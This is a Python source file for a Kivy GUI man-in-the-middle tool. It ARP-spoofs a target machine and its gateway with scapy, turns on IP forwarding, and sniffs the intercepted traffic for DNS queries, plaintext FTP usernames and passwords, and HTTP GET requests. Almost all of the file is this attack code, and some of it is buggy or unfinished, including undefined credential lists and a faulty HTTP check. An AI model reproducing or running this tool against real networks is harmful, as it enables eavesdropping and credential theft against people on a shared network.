from kivy.uix.boxlayout import BoxLayout	
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.image import Image
from kivy.lang import Builder
from kivy.app import App
from kivy.uix.scrollview import ScrollView
from kivy.uix.screenmanager import ScreenManager, Screen
from subprocess import check_output

#from MiTM import *
from scapy.all import *
import sys
import os
import time
import threading

list1=["hello"]

Builder.load_string('''

<MITMs1>:
	BoxLayout:
		canvas:
			Rectangle:
				source: 'back1.jpg'
				size: self.size
				pos: self.pos
		
		BoxLayout:
			orientation: 'vertical'
			id: client_box
			size_hint: 1, 1
			Image:
				source: 'pyspin.zip'
				anim_delay: 1/80
				allow_stretch: False
				pos_hint: {'x': -.3}
			Label:
				id: label1
				markup: True
				size_hint: 1, 1
				text: 'Enter the configuration'
				text_size: self.size
    			halign: 'left'
    			valign: 'middle'
			TextInput:
				id: input1
				size_hint: 0.8, 1
				text: 'wlan0'
				multiline: False
			Label:
				id: label2
				markup: True
				size_hint: 1,1
				text: 'Enter victim ip'
				text_size: self.size
    			halign: 'left'
    			valign: 'middle'
    		TextInput:
				id: input2
				size_hint: 0.8, 1
				text: '192.168.'
				multiline: False
			Label:
				id: label3
				markup: True
				size_hint: 1,1
				text: 'Enter router ip'
				text_size: self.size
    			halign: 'left'
    			valign: 'middle'
    		TextInput:
				id: input3
				size_hint: 0.8, 1
				text: '192.168.1'
				multiline: False
			Label:
				id: label4
				markup: True
				size_hint: 1,1
				text: ''
				text_size: self.size
    			halign: 'left'
    			valign: 'middle'
			BoxLayout:
				size_hint: 0.2, 1
				padding_left: 10
				Button:
					size_hint: 0.2, 1
					text: 'run ifconfig'
					on_release: root.poison(); root.change_screen(); root.manager.get_screen('MITMs2').update(root.input1.text, root.input2.text, root.input3.text)
					background_normal: 'button.jpg'		
<MITMs2>:
	BoxLayout:
		orientation: 'vertical'
		canvas:
			Rectangle:
				source: 'back1.jpg'
				size: self.size
				pos: self.pos
		

		Label:
			id: label5
			size_hint: 0.5, 0.5
			text:''
			text_size: self.size
        	font_size: '20sp'
			markup: True

		Button:
			id: PoisonButton
			on_press: root.mitm()
			text: 'Start Poisoning..'
			size_hint: 0.5, 0.1

		Button:
			id: DNSbutton
			text: 'Start DNS Sniffing..'
			on_press: root.dsniff()
			disabled: True
			size_hint: 0.5,0.1

		Button:
			id: FTPButton
			text: 'Start FTP Sniffing..'
			on_press: root.ftp_sniff()
			disabled: True
			size_hint: 0.5,0.1

		Button:
			id: HTTPButton
			text: 'Start HTTP Sniffing..'
			on_press: root.http_sniff()
			disabled: True
			size_hint: 0.5,0.1

		Button:
			text: 'Go Back'
			on_press: root.reARP(); root.main_screen()
			size_hint: 0.5,0.1

		ScrollView:
			size_hint: 0.3, 1
			do_scroll_x: False
			BoxLayout:
				orientation: 'vertical'
				id: nodes
				size_hint: 1, None		

	''')

class MITMs1(Screen):
	def __init__(self,**kwargs):
		super(MITMs1,self).__init__(**kwargs)
		
		self.input1=self.ids['input1']
		self.label1=self.ids['label1']
		self.input2=self.ids['input2']
		self.label2=self.ids['label2']
		self.input3=self.ids['input3']
		self.label3=self.ids['label3']
		
		self.client_box=self.ids['client_box']

		#self.nodes=self.ids['nodes']

	def run_ifconfig(self):
		self.ifconfig=subprocess.check_output(['ifconfig', self.input1.text])
		self.iface, self.my_ip, self.MAC, self.Bcast, self.Nmask, self.ipv6=(self.ifconfig.split()[i]for i in (0,6,4,7,8,2))

		self.label1.text=('[color=00ff00][i][b]My Device[/b][/i][/color]' + '\n\n' + 'Interface: ' + '\n\nip:'+'[color=00ff00][i]{0}[/i][/color]'.format(self.my_ip[5:])+'\n\n' )

		''''for i in xrange(10):
			self.nodes.add_widget(Button(text=str(i),height='200sp'))
		self.h=i
		self.nodes.size=(1, self.h*150)
		'''
		self.change_screen()


	def poison(self):
		'''try:
			interface = self.input1.text
			victimIP = self.input2.text
			gateIP = self.input3.text
		except KeyboardInterrupt:
			#print "\n[*] User Requested Shutdown"
			#print "[*] Exiting..."
			sys.exit(1)
			'''
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		#self.change_screen()
		#get_screen('MITMs2').update(self.input1.text)


	def change_screen(self):
		sm.current='MITMs2'


class MITMs2(Screen):
	def __init__(self,**kwargs):
		super(MITMs2,self).__init__(**kwargs)
		self.label5=self.ids['label5']
		self.DNSbutton=self.ids['DNSbutton']
		self.PoisonButton=self.ids['PoisonButton']
		self.FTPbutton=self.ids['FTPButton']
		self.HTTPbutton=self.ids['HTTPButton']
		self.nodes=self.ids['nodes']
		#self.mitm()

	def update(self, inter, vip, gip):
		self.int=inter
		self.vip=vip
		self.gip=gip

	def get_mac(self, IP):
		conf.verb = 0
		ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = self.int, inter = 0.1)
		for snd,rcv in ans:
			return rcv.sprintf(r"%Ether.src%")

	def http_sniff(self):
		self.ThreadObj1=Thread4(self.int)
		self.ThreadObj1.setDaemon(True)
		self.ThreadObj1.start()
		self.DNSbutton.disabled=True
		self.FTPbutton.disabled=True
		self.HTTPbutton.disabled=True
	

	def reARP(self):
	
		#print "\n[*] Restoring Targets..."
		self.label5.text="Restoring Targets.."
		self.victimMAC = self.get_mac(self.vip)
		self.gateMAC = self.get_mac(self.gip)
		send(ARP(op = 2, pdst = self.gip, psrc = self.vip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = self.victimMAC), count = 7)
		send(ARP(op = 2, pdst = self.vip, psrc = self.gip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = self.gateMAC), count = 7)
		#print "[*] Disabling IP Forwarding..."
		self.label5.text="Disabling IP Forwarding"
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		#print "[*] Shutting Down..."
		self.label5.text="Shutting Down.."
		'''self.ThreadObj1.exit()
		self.ThreadObj2.exit()
		self.ThreadObj3.exit()
		'''
		self.PoisonButton.disabled=False
		self.DNSbutton.disabled=False
		self.FTPbutton.disabled=False
		self.HTTPbutton.disabled=False

	def trick(self, gm, vm):
		send(ARP(op = 2, pdst = self.vip, psrc = self.gip, hwdst= vm))
		send(ARP(op = 2, pdst = self.gip, psrc = self.vip, hwdst= gm))


	def main_screen(self):
		#self.reARP()
		#for t in threads:
		#	t.kill_recieved=True
		sm.current='MITMs1'

	def ftp_sniff(self):
		print '[*] Sniffing Started on %s... \n' % self.int
		self.ThreadObj2=Thread3(self.int)
		self.ThreadObj2.start()
		self.DNSbutton.disabled=True
		self.FTPbutton.disabled=True
		self.HTTPbutton.disabled=True

	def dsniff(self):
		self.ThreadObj3=Thread2(self.int, self.label5)
		self.ThreadObj3.setDaemon(True)
		

		self.ThreadObj4=Thread5(self.nodes)
		self.ThreadObj4.setDaemon(True)
		self.ThreadObj4.start()
		self.ThreadObj3.start()
		'''
		for i in xrange(20):
			arprequest = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip+str(i), hwdst= 'ff:ff:ff:ff:ff:ff')
			arpresponse=srp1(arprequest, timeout=1, verbose=0)
			if arpresponse:
				self.nodes.add_widget(Button(text='[color=00ff00][i]Host is up[/i][/color]' + 
					'\n[color=00ff00]IP: {0}[/color]'.format(arpresponse.psrc)+
					'\n[color=00ff00]MAC: {0}[/color]'.format(arpresponse.hwsrc),markup=True, font_size='15sp',height='200sp'))
		self.h=i
		'''
		self.nodes.size=(200, 400)
		self.DNSbutton.disabled=True
		self.FTPbutton.disabled=True
		self.HTTPbutton.disabled=True
	
		#sniff(iface = str(self.int),filter = "port 53", prn = querysniff, store = 0)
		#print "\n[*] Shutting Down..."

	def mitm(self):
		#os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		try:
			self.victimMAC = self.get_mac(self.vip)
		except Exception:
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		
			#print "[!] Couldn't Find Victim MAC Address"
			#print "[!] Exiting..."
			self.label5.text=('[color=00ff00][i][b]Couldnt Find Victim MAC Address[/b][/i][/color]' + '\n\n' + 'Exiting..')
			#sys.exit(1)
		try:
			self.gateMAC = self.get_mac(self.gip)
		except Exception:
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		
			#print "[!] Couldn't Find Gateway MAC Address"
			#print "[!] Exiting..."
			self.label5.text=('[color=00ff00][i][b]Couldnt Find Gateway MAC Address[/b][/i][/color]' + '\n\n' + 'Exiting..')
			#sys.exit(1)
		self.label5.text=('Poisoning Targets...')
		ThreadObj=ThreadNew(self.gateMAC,self.victimMAC, self.vip, self.gip)
		ThreadObj.setDaemon(True)
		ThreadObj.start()	
		self.PoisonButton.disabled=True
		self.DNSbutton.disabled=False
		self.FTPbutton.disabled=False
		self.HTTPbutton.disabled=False


		#while 1:
		#	self.trick(self.gateMAC, self.victimMAC)
		#	time.sleep(1.5)
			#except KeyboardInterrupt:
			#	self.reARP()
			#	break
		

		#self.label5.text=('[color=00ff00][i][b]My Device[/b][/i][/color]' + '\n\n' + 'Interface: ' + '\n\nip:'+'[color=00ff00][i]{0}[/i][/color]'.format(self.int)+'\n\n' )
		#self.label5.text=interface
#dnsp=""

def check_login(pkt, username, password):
	try:
		if '230' in pkt[Raw].load:
			print '[*] Valid Credentials Found... '
			print '\t[*] ' + str(pkt[IP].dst).strip() + ' -> ' + str(pkt[IP].src).strip() + ':'
			print '\t   [*] Username: ' + username
			print '\t   [*] Password: ' + password + '\n'
			return
		else:
			return
	except Exception:
		return	

def check_for_ftp(pkt):
	if pkt.haslayer(TCP) and pkt.haslayer(Raw):
		if pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
			return True
		else:
			return False
	else:
		return False

def check_pkt(pkt):
	if check_for_ftp(pkt):
		pass
	else:
		return
	data = pkt[Raw].load
	if 'USER ' in data:
		usernames.append(data.split('USER ')[1].strip())
	elif 'PASS ' in data:
		passwords.append(data.split('PASS ')[1].strip())
	else:
		check_login(pkt, usernames[-1], passwords[-1])
	return



def http_header(packet):
        http_packet=str(packet)
        if http_packet.find('GET'):
                return GET_print(packet)

def GET_print(packet1):
    ret = "***************************************GET PACKET****************************************************\n"
    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
    ret += "*****************************************************************************************************\n"
    return ret


def querysniff(pkt):
	if IP in pkt:
		ip_src = pkt[IP].src
		ip_dst = pkt[IP].dst	
		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
			dnsp=pkt.getlayer(DNS).qd.qname
			print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + dnsp + "))) "
			#nodes.text=nodes.text+'\n'+pkt.getlayer(DNS).qd.qname
			global list1
			list1.append(dnsp)
			#print "xx:"+str(list1[0])
			


class Thread4(threading.Thread):
	def __init__(self, inter):
		self.inter=inter
		threading.Thread.__init__(self)
	def run(self):
		sniff(iface=str(self.inter), prn=http_header, filter="tcp port 80")

			
class Thread3(threading.Thread):
	def __init__(self, inter):
		self.inter=inter
		threading.Thread.__init__(self)
	def run(self):
		try:
			sniff(iface=self.inter, prn=check_pkt, store=0)
		except Exception:
			print '[!] Error: Failed to Initialize Sniffing'
			sys.exit(1)
		print '\n[*] Sniffing Stopped'

class Thread2(threading.Thread):
	def __init__(self, inter, nodes):
		self.inter=inter
		self.nodes=nodes
		self.h=0
		threading.Thread.__init__(self)
	def run(self):
		global list1
		sniff(iface = str(self.inter),filter = "port 53", prn = querysniff, store = 0)
		#self.nodes.add_widget(Button(text=str(self.dnsp),height='200sp'))
		#self.h=self.h+1
		#self.nodes.size=(1, self.h*150)
		#print "xxx:"+ dnsp
		#self.nodes.text=self.nodes.text+'\n'+self.dnsp

class Thread5(threading.Thread):
	def __init__(self, nodes):
		self.nodes=nodes
		self.h=0
		threading.Thread.__init__(self)
	def run(self):
		global list1
		while 1:
			for i in range(self.h, len(list1), 1):
				self.nodes.add_widget(Button(text=str(list1[i]),height='200sp'))
				self.nodes.size=(1, self.h*150)
				self.h+=1
				time.sleep(2)

class ThreadNew(threading.Thread):
	def __init__(self, gm, vm, vip, gip):
		self.gm=gm
		self.vm=vm
		self.vip=vip
		self.gip=gip
		threading.Thread.__init__(self)

	def run(self):
		send(ARP(op = 2, pdst = self.vip, psrc = self.gip, hwdst= self.vm))
		send(ARP(op = 2, pdst = self.gip, psrc = self.vip, hwdst= self.gm))


class MITMtool(App):
	def build(self):
		return sm

sm=ScreenManager()

sm.add_widget(MITMs1(name='MITMs1'))

sm.add_widget(MITMs2(name='MITMs2'))

if __name__=='__main__':
	MITMtool().run()
